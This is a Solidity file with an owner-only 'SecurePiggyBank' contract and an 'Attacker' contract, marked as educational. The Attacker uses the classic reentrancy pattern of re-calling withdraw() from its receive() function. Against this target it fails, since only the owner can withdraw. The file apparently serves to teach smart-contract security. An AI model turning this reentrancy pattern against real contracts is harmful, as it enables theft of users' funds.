// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SecurePiggyBank {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function deposit() public payable {}

    function withdraw() public {
        require(msg.sender == owner, "Not the owner");
        uint amount = address(this).balance;
        require(amount > 0, "Nothing to withdraw");
        (bool success, ) = payable(owner).call{value: amount}("");
        require(success, "Transfer failed");
    }
}

// For educational testing only
contract Attacker {
    address public target;
    address public owner;

    constructor(address _target) {
        target = _target;
        owner = msg.sender;
    }

    receive() external payable {
        if (address(target).balance > 0) {
            SecurePiggyBank(target).withdraw();
        }
    }

    function attack() public payable {
        require(msg.value > 0, "Send ETH to attack");
        SecurePiggyBank(target).deposit{value: msg.value}();
        SecurePiggyBank(target).withdraw();
    }

    function collect() public {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}
